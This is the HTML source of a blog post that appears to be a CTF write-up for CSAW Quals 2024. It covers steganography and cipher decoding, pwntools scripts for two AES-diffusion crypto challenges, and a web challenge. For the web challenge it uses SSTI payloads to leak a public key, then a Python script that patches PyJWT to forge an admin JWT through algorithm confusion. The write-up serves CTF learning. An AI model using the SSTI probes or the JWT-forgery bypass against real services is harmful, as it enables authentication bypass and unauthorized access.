@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CSAW Quals 2024 | Rezy Dev</title>
+<meta name="keywords" content="CTF, CSAW, Forensics, Web, Crypto">
+<meta name="description" content="Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.
+The Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.
+╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ.">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/posts/ctf/csaw-quals-2024/">
+<meta name="google-site-verification" content="XYZabc">
+<meta name="yandex-verification" content="XYZabc">
+<meta name="msvalidate.01" content="XYZabc">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="apple-touch-icon" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<link rel="mask-icon" href="https://raw.githubusercontent.com/Rezy-Dev/Rezy-Dev.github.io/master/static/me.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ctf/csaw-quals-2024/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="CSAW Quals 2024" />
+<meta property="og:description" content="Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.
+The Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.
+╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/ctf/csaw-quals-2024/" />
+<meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E" />
+<meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-09-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-09-11T00:00:00+00:00" /><meta property="og:site_name" content="Rezy Dev" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E" />
+<meta name="twitter:title" content="CSAW Quals 2024"/>
+<meta name="twitter:description" content="Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.
+The Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.
+╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CSAW Quals 2024",
+      "item": "http://localhost:1313/posts/ctf/csaw-quals-2024/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSAW Quals 2024",
+  "name": "CSAW Quals 2024",
+  "description": "Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.\nThe Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.\n╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ.",
+  "keywords": [
+    "CTF", "CSAW", "Forensics", "Web", "Crypto"
+  ],
+  "articleBody": "Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.\nThe Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.\n╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ. XP Comment : Now that you know what operation is needed, have you found the right key? Comment : Can you crack my secret? Here's a list of numbers: See what they reveal. 0 0 0 0 0 0 0 0 15 23 23 4 7 0 22 1 23 28 0 18 10 12 0 7 23 2 17 18 21 16 0 0 0 0 0 28 7 16 17 16 6 17 11 0 1 0 21 23 4 24 0 0 0 0 0 0 ╭─rezy@dev ~/Desktop/images ╰─➤ zsteg -a hibiscus.png | grep { b1,rgb,lsb,xy .. text: \"ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}\" ╭─rezy@dev ~/Desktop/images ╰─➤ zsteg -a roses.png | grep { b1,rgb,lsb,xy .. text: \"csawctf{heres_akey_now_decrypt_the_vigenere_cipher_text}\" I then used the key obtained from roses.png to decode the given cipher: ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}. The decryption was performed using the key csawctfheresakeynowdecryptthevigenereciphertext, after removing the underscores and curly braces. This process gave us a new key: csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}.\nWith the given key, I used this code:\ndef xor_decrypt(numbers, key): key_ascii = [ord(c) for c in key] key_length = len(key_ascii) decrypted_chars = [] for i, num in enumerate(numbers): key_char = key_ascii[i % key_length] # xor decrypted_char = num ^ key_char # printable ASCII range 32 - 126 decrypted_char = (decrypted_char - 32) % (126 - 32 + 1) + 32 # conv to char decrypted_chars.append(chr(decrypted_char)) return ''.join(decrypted_chars) numbers = [0, 0, 0, 0, 0, 0, 0, 0, 15, 23, 23, 4, 7, 0, 22, 1, 23, 28, 0, 18, 10, 12, 0, 7, 23, 2, 17, 18, 21, 16, 0, 0, 0, 0, 0, 28, 7, 16, 17, 16, 6, 17, 11, 0, 1, 0, 21, 23, 4, 24, 0, 0, 0, 0, 0, 0] key = \"csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}\" decrypted_message = xor_decrypt(numbers, key) print('flag is: ', decrypted_message) The code defines a function xor_decrypt that decrypts a list of numbers using a key by applying an XOR operation. It converts each character of the key to its ASCII value and uses it to decrypt the corresponding number in the list, ensuring the result falls within the printable ASCII range. Finally, the decrypted values are combined into a string and printed as the result.\nAnd we get our flag as csawctf{great_work_you_cracked_the_obscured_secret_flag}.\nLost Pyramid (Web) We were given the source code, and upon reviewing it, we found that we needed to access the /kings_lair endpoint to obtain the flag. To reach that endpoint, we required a valid JWT token. The source code also revealed that the payload of the JWT must include a valid KINGSDAY in the CURRENT_DATE setup. Below is the typical JWT for a regular user:\n{ \"ROLE\": \"commoner\", \"CURRENT_DATE\": \"07_09_2024_AD\", \"exp\": 96333722311 } The role must be set to “royalty.”\nAdditionally, the source code indicates that a private key is used to generate the JWT. We can exploit a algorithm confusion attack to forge a JWT token, but we first need to identify the public key. To discover the KINGSDAY and PUBLICKEY, I found Server-Side Template Injection (SSTI) vulnerability at the /scarab_room endpoint using payloads {{ PUBLICKEY }} and {{ KINGSDAY }}. This revealed the following:\nPublic Key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2 KINGSDAY: 03_07_1341_BC So with the information I have, I wrote a python code to forge a JWT token for me:\nimport jwt import datetime public_key = \"\"\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2\"\"\" kingsday = \"03_07_1341_BC\" payload = { \"ROLE\": \"royalty\", \"CURRENT_DATE\": kingsday, \"exp\": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000)) } token = jwt.encode(payload, public_key, algorithm=\"HS256\") print(\"jwt token:\", token) Which, upon running, gives the following error:\njwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret. So, after some research, I found that forging a token like this is no longer possible with the latest version of PyJWT. Instead, you can install pyjwt==0.4.3 with pip install pyjwt==0.4.3 and run the code above. However, there is also a hackish solution that someone posted.\nThen I tried this method and adjusted my code accordingly. This is the final version I created:\nimport jwt import datetime # Prepare an override method to bypass key checks def prepare_key(key): return jwt.utils.force_bytes(key) # Override HS256's prepare key method to disable the asymmetric key check jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key # Your public key (which is normally only for verification, not signing) public_key = \"\"\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2\"\"\" # JWT payload kingsday = \"03_07_1341_BC\" payload = { \"ROLE\": \"royalty\", \"CURRENT_DATE\": kingsday, \"exp\": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000)) } # Generate a JWT using the public key, bypassing the security check token = jwt.encode(payload, key=public_key, algorithm='HS256') # Print the JWT token print(\"JWT token:\", token) Then this gave me a JWT, which I used in Burp Suite to get our flag. AES Diffusion (Crypto) We were given a port and an IP to connect to, i.e., nc diffusion.ctf.csaw.io 5000. We also received an aes_simulator.py file with the following content:\nN_ROWS = 4 N_COLS = 4 def CyclicShift(row, shift): return row[shift:] + row[:shift] def ShiftRows(state): for row_index in range(N_ROWS): state[row_index] = CyclicShift(state[row_index], row_index) return state def BuildExpressionString(column, matrix_row): expression = \"(\" for (i,coefficient) in enumerate(matrix_row): term = str(coefficient) + \"*\" + column[i] should_insert_plus = i \u003c len(matrix_row) - 1 expression += term if should_insert_plus: expression += \" + \" return expression + \")\" def GetStateColumn(state, column_index): column = [] for row in state: column.append(row[column_index]) return column def MultiplyColumn(column): matrix = [ [2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2] ] new_column = [] for row in matrix: new_element = BuildExpressionString(column, row) new_column.append(new_element) return new_column def MixColumns(state): new_columns = [] for column_index in range(N_COLS): column = GetStateColumn(state, column_index) new_column = MultiplyColumn(column) new_columns.append(new_column) return Transpose(new_columns) def Transpose(matrix): return [[matrix[j][i] for j in range(len(matrix))] for i in range(len(matrix[0]))] def PrettyPrint(matrix): for row in matrix: print(row) def PrettyPrint2(matrix): for row in matrix: for element in row: print(element) state = [[\"x0\", \"x4\", \"x8\", \"x12\"], [\"x1\", \"x5\", \"x9\", \"x13\"], [\"x2\", \"x6\", \"x10\", \"x14\"], [\"x3\", \"x7\", \"x11\", \"x15\"]] def AESRound(state): return MixColumns(ShiftRows(state)) def AES(state, rounds): for r in range(rounds): state = AESRound(state) return state PrettyPrint(AES(state,2)) The Python code simulates parts of the AES (Advanced Encryption Standard) encryption process, specifically focusing on ShiftRows and MixColumns operations. Here’s a short explanation:\nKey Operations: ShiftRows:\nEach row of the 4x4 state matrix is shifted to the left by a certain number of positions, where the first row is not shifted, the second row is shifted by 1 position, and so on. MixColumns:\nEach column of the state matrix is multiplied by a fixed 4x4 matrix using modular arithmetic (though here, the code generates string expressions to represent this multiplication). Functions: ShiftRows(state): Shifts rows of the state matrix cyclically. MixColumns(state): Mixes the columns of the matrix by multiplying each with a fixed transformation matrix. AESRound(state): Performs one round of AES by applying ShiftRows and MixColumns. AES(state, rounds): Runs multiple rounds of AES on the state matrix. Example: The code initializes a 4x4 matrix (the state) with symbolic values (x0, x1, …, x15), performs 2 rounds of AES, and prints the final matrix.\nThe goal is to simulate the AES encryption transformations in a simplified, symbolic way, without performing actual byte-level encryption.\nExploit I will write a Python script using the pwntools library to exploit the AES diffusion challenge. First, I will connect to the server using nc diffusion.ctf.csaw.io 5000. Once connected, I will send the following input matrix that simulates part of the AES encryption process:\n[['x0', 'x4', 'x8', 'x12'], ['x5', 'x9', 'x13', 'x1'], ['x10', 'x14', 'x2', 'x6'], ['x15', 'x3', 'x7', 'x11']] After that, I will input the matrix transformation that applies the MixColumns step in AES. This will look like:\n[['2*x0 + 3*x5 + 1*x10 + 1*x15', ... (more matrixes here)] Then, I will provide the variables to simulate column mixing and input their respective values. I will also confirm that no other operations need to be done and set a few of the variables to zero to influence the output.\nFinally, after providing a formula for transformation and confirming that I do not need further diffusion, I will receive the correct output and retrieve the flag, which will complete the challenge. So our final script is:\nfrom pwn import * p=remote(\"diffusion.ctf.csaw.io\",5000) p.sendlineafter(\"answer\",\"[['x0', 'x4', 'x8', 'x12'], ['x5', 'x9', 'x13', 'x1'], ['x10', 'x14', 'x2', 'x6'], ['x15', 'x3', 'x7', 'x11']]\") p.sendlineafter(\"answer\",\"[['2*x0 + 3*x5 + 1*x10 + 1*x15', '2*x4 + 3*x9 + 1*x14 + 1*x3', '2*x8 + 3*x13 + 1*x2 + 1*x7', '2*x12 + 3*x1 + 1*x6 + 1*x11'], ['1*x0 + 2*x5 + 3*x10 + 1*x15', '1*x4 + 2*x9 + 3*x14 + 1*x3', '1*x8 + 2*x13 + 3*x2 + 1*x7', '1*x12 + 2*x1 + 3*x6 + 1*x11'], ['1*x0 + 1*x5 + 2*x10 + 3*x15', '1*x4 + 1*x9 + 2*x14 + 3*x3', '1*x8 + 1*x13 + 2*x2 + 3*x7', '1*x12 + 1*x1 + 2*x6 + 3*x11'], ['3*x0 + 1*x5 + 1*x10 + 2*x15', '3*x4 + 1*x9 + 1*x14 + 2*x3', '3*x8 + 1*x13 + 1*x2 + 2*x7', '3*x12 + 1*x1 + 1*x6 + 2*x11']]\") p.sendlineafter(\"al order\",\"x0,x5,x10,x15\") p.sendlineafter(\"al order\",\"x2,x7,x8,x13\") p.sendlineafter(\"(yes/no)\",\"no\") p.sendlineafter(\"answer\",\"12\") p.sendlineafter(\"al order\",\"x0:1,x5:1,x10:1,x15:1\") p.sendlineafter(\"al order\",\"x0:0,x1:0,x2:0,x3:0,x4:0,x5:0,x6:0,x7:0,x8:0,x9:0,x10:0,x11:0,x12:0,x13:0,x14:0,x15:0\") p.sendlineafter(\"al order\",\"x0\") p.sendlineafter(\"tor code\",\"(2*(2*x0 + 3*x1 + 1*x2 + 1*x3) + 3*(1*x0 + 2*x1 + 3*x2 + 1*x3) + 1*(1*x0 + 1*x1 + 2*x2 + 3*x3) + 1*(3*x0 + 1*x1 + 1*x2 + 2*x3))\") p.sendlineafter(\"iffusion?\",\"no\") print(p.recvall()) And there we go, we have the flag as csawctf{1_n0w_und3r5t4nd_435_d1ffu510n}.\nDiffusion Pop Quiz (Crypto) Here we are given ans_extractor.py:\n# To ensure correctly formatted answers for the challenge, use 1-indexed values for the output bits. # For example, if you have an S-Box of 8 bits to 8 bits, the first output bit is 1, the second is 2, and so forth. # Your ANF expression will have the variables y1, y2, ..., y8. # Put your S-Boxes here. example = [1, 0, 0, 0, 1, 1, 1, 0] # 3 input bits: 000, 001, 010, 011, 100, 101, 110, 111 # Array indexes: 0 1 2 3 4 5 6 7 # f(x1,x2,x3): 0 1 0 0 0 1 1 1 # Customize the following settings to extract specific bits of specific S-Boxes and have a comfortable visualization of terms. SYMBOL = 'x' INPUT_BITS = 3 OUTPUT_BITS = 1 SBOX = example BIT = 1 # Ignore the functions, we've implemented this for you to save your time. # Don't touch it, it might break and we don't want that, right? ;) def get_sbox_result(input_int): return SBOX[input_int] def get_term(binary_string): term = \"\" i = 1 for (count,bit) in enumerate(binary_string): if bit == \"1\": term += SYMBOL+str(i)+\"*\" i += 1 if term == \"\": return \"1\" return term[:-1] def get_poly(inputs, outputs): poly = \"\" for v in inputs: if outputs[v]: poly += get_term(v) + \"+\" return poly[:-1] def should_sum(u, v, n): for i in range(n): if u[i] \u003e v[i]: return False return True def get_as(vs, f, n): a = {} for v in vs: a[v] = 0 for u in vs: if should_sum(u, v, n): a[v] ^= f[u] return a def get_anf(vs, f, n): return get_poly(vs, get_as(vs, f, n)) def get_vs_and_fis_from_sbox(which_fi): vs = [] fis = {} for input_integer in range(2**INPUT_BITS): sbox_output = get_sbox_result(input_integer) input_integer_binary = bin(input_integer)[2:].zfill(INPUT_BITS) fis[input_integer_binary] = 0 sbox_output_binary = bin(sbox_output)[2:].zfill(OUTPUT_BITS) vs.append(input_integer_binary) fis[input_integer_binary] = int(sbox_output_binary[which_fi-1]) return vs, fis def get_anf_from_sbox_fi(which_fi): vs, fis = get_vs_and_fis_from_sbox(which_fi) poly = get_anf(vs, fis, INPUT_BITS) return poly output = get_anf_from_sbox_fi(BIT) print(output) This code generates the Algebraic Normal Form (ANF) of a Boolean function corresponding to the output bit(s) of an S-Box. Here’s an explanation:\nKey Concepts: S-Box: A substitution box used in cryptographic algorithms to perform a substitution of input bits with output bits. It’s a non-linear mapping of input to output. ANF (Algebraic Normal Form): A way to represent Boolean functions using XOR and AND operations. ANF expressions are polynomials with binary coefficients (0 or 1). Input/Output Bits: The S-Box takes a fixed number of input bits and returns output bits. In this example, 3 input bits map to 1 output bit. Code Breakdown: Settings:\nSYMBOL = 'x': The variables used for the input bits (e.g., x1, x2, x3). INPUT_BITS = 3: The S-Box uses 3 input bits (x1, x2, x3), resulting in 8 possible input values (from 000 to 111). OUTPUT_BITS = 1: The S-Box outputs 1 bit. SBOX = example: The example S-Box provides a mapping of the 8 possible input values to 1 output bit each. ANF Extraction Process:\nget_sbox_result(input_int): Returns the S-Box output for a given input. get_term(binary_string): Converts a binary input string (e.g., 001) to a polynomial term (e.g., x2). get_poly(inputs, outputs): Constructs the ANF polynomial from the terms that contribute to the output. get_vs_and_fis_from_sbox(which_fi): Extracts input-output pairs for the S-Box and identifies which output bit is being analyzed (based on BIT). get_anf(vs, f, n): Combines input-output relationships into the ANF expression using XOR and AND operations. The Process:\nThe code analyzes the S-Box example, which maps 3 input bits to 1 output bit. For each input bit pattern (from 000 to 111), it checks the corresponding output bit and builds an ANF representation for that output bit. The final output is a polynomial representing the selected output bit in ANF form. Example: If we have the following example S-Box:\nexample = [1, 0, 0, 0, 1, 1, 1, 0] # 3 input bits -\u003e 1 output bit For input 000, the S-Box outputs 1. For input 001, it outputs 0, and so on.\nThe goal of the script is to generate a Boolean polynomial for the output bit of the S-Box, based on the input bits.\nOutput: The script prints the ANF expression for the given output bit. For the example provided, the expression might look something like:\nx1*x2 + x3 + 1 This indicates that the output bit depends on a combination of the input bits in this particular form.\nExploit To exploit the diffusion challenge at diffusion-pop-quiz.ctf.csaw.io, I will connect to the server and interact with it based on the specific prompts provided.\nFirst, I will establish a connection using pwn and input my initial response when prompted. The remote server will ask for an answer to a question, and I will respond with “a”. Following this, I will encounter a query about the answer being correct, to which I will respond with “no”.\nNext, when the server asks, “Diffusion matters a lot, right?”, I will send the reply, “Diffusion matters a lot”. Once prompted with the hexadecimal number, I will enter '0x16'.\nThe server will then ask for Boolean expressions. I will systematically input the appropriate expressions, starting with:\nx3+x2*x3+x1*x2 Then, repeat x3+x2*x3+x1*x2. I will follow this up with the larger expression: 1+x3+x2+x2*x3+x1*x3+x1*x2. The final large Boolean expression will be quite complex, but I will input it in response to the server’s prompts.\nFor the last few steps, I will input the variable order as x1,x2,x3,x4,x5,x6,x7,x8 and respond with “yes” when the server asks for confirmation.\nThe server will continue to prompt me for more Boolean expressions, to which I will provide the appropriate responses. With all these our final script is:\nfrom pwn import * p=remote(\"diffusion-pop-quiz.ctf.csaw.io\",5000) p.sendlineafter(\"?\",\"a\") p.sendlineafter(\")\",\"no\") p.sendlineafter(\"?\",\"Diffusion matters a lot\") p.sendlineafter(\"with the 0x\",'0x16') p.sendlineafter(\"given you\",'x3+x2*x3+x1*x2') p.sendlineafter(\"given you\",'x3+x2*x3+x1*x2') p.sendlineafter(\"given you\",'1+x3+x2+x2*x3+x1*x3+x1*x2') p.sendlineafter(\"given you\",'x8+x7+x6+x5+x5*x6+x5*x6*x8+x5*x6*x7*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7*x8+x4*x5*x7*x8+x4*x5*x6*x8+x3*x7+x3*x7*x8+x3*x6+x3*x6*x7+x3*x6*x7*x8+x3*x5*x7+x3*x5*x6*x8+x3*x5*x6*x7*x8+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x7*x8+x3*x4*x6+x3*x4*x6*x7+x3*x4*x6*x7*x8+x3*x4*x5*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x8+x2*x4+x2*x4*x7*x8+x2*x4*x6*x7+x2*x4*x5*x8+x2*x4*x5*x6+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7+x2*x3+x2*x3*x8+x2*x3*x7+x2*x3*x7*x8+x2*x3*x6*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x7+x2*x3*x5*x6+x2*x3*x4+x2*x3*x4*x8+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5*x7+x1*x8+x1*x7+x1*x7*x8+x1*x6+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5+x1*x5*x8+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x7*x8+x1*x4*x6+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5+x1*x4*x5*x8+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x5*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x8+x1*x3*x4*x5*x6*x7*x8+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x7*x8+x1*x2*x6+x1*x2*x6*x8+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5+x1*x2*x5*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6+x1*x2*x5*x6*x8+x1*x2*x5*x6*x7+x1*x2*x5*x6*x7*x8+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8') p.sendlineafter(\"merical order\\r\\n\",\"x1,x2,x3,x4,x5,x6,x7,x8\") p.sendlineafter(\")\",\"yes\") p.sendlineafter(\"given you\",'x7*x8+x6+x6*x7*x8+x5*x7+x5*x6+x5*x6*x7+x4*x7+x4*x6*x7+x4*x6*x7*x8+x4*x5+x4*x5*x7+x4*x5*x6*x8+x4*x5*x6*x7+x3+x3*x7*x8+x3*x6*x7+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x6*x8+x3*x4*x6*x7+x3*x4*x5+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7*x8+x2*x6*x8+x2*x6*x7+x2*x6*x7*x8+x2*x5+x2*x5*x8+x2*x5*x7*x8+x2*x4+x2*x4*x8+x2*x4*x6+x2*x4*x6*x8+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7*x8+x2*x3*x7+x2*x3*x6+x2*x3*x6*x7*x8+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x8+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x7+x2*x3*x4*x5*x7+x2*x3*x4*x5*x7*x8+x2*x3*x4*x5*x6*x8+x2*x3*x4*x5*x6*x7+x1*x7+x1*x7*x8+x1*x6*x8+x1*x5+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4*x7*x8+x1*x4*x6*x7+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3+x1*x3*x8+x1*x3*x7+x1*x3*x7*x8+x1*x3*x6*x8+x1*x3*x5*x7+x1*x3*x5*x6+x1*x3*x5*x6*x7+x1*x3*x5*x6*x7*x8+x1*x3*x4+x1*x3*x4*x8+x1*x3*x4*x7+x1*x3*x4*x7*x8+x1*x3*x4*x6+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x7+x1*x3*x4*x5*x6+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x6+x1*x2*x5*x6*x7*x8+x1*x2*x4*x7*x8+x1*x2*x4*x6*x8+x1*x2*x4*x5+x1*x2*x4*x5*x7+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3+x1*x2*x3*x8+x1*x2*x3*x6*x7+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x8+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8') p.sendlineafter(\"merical order\\r\\n\",\"x1,x2,x3,x4,x5,x6,x7,x8\") p.sendlineafter(\")\",\"yes\") p.sendlineafter(\"given you\",'x8+x7+x6*x8+x5*x8+x5*x7*x8+x5*x6+x5*x6*x8+x4*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7+x4*x5+x4*x5*x8+x4*x5*x7+x4*x5*x7*x8+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3+x3*x8+x3*x7*x8+x3*x6*x8+x3*x6*x7+x3*x6*x7*x8+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6*x8+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x8+x3*x4*x7+x3*x4*x6+x3*x4*x6*x7*x8+x3*x4*x5+x3*x4*x5*x6*x7+x3*x4*x5*x6*x7*x8+x2*x8+x2*x7*x8+x2*x6*x7+x2*x5*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x7+x2*x5*x6*x7*x8+x2*x4*x8+x2*x4*x7*x8+x2*x4*x6*x8+x2*x4*x5+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3+x2*x3*x7+x2*x3*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5+x2*x3*x4*x5*x7+x2*x3*x4*x5*x6*x8+x1+x1*x8+x1*x7*x8+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5*x8+x1*x5*x7+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5*x8+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7*x8+x1*x3*x8+x1*x3*x7+x1*x3*x6*x7+x1*x3*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x4*x7+x1*x3*x4*x6+x1*x3*x4*x6*x7+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x7+x1*x2+x1*x2*x8+x1*x2*x6+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6*x7+x1*x2*x4+x1*x2*x4*x7*x8+x1*x2*x4*x6+x1*x2*x4*x6*x7+x1*x2*x4*x5*x7+x1*x2*x4*x5*x7*x8+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x7+x1*x2*x3*x6+x1*x2*x3*x6*x8+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7+x1*x2*x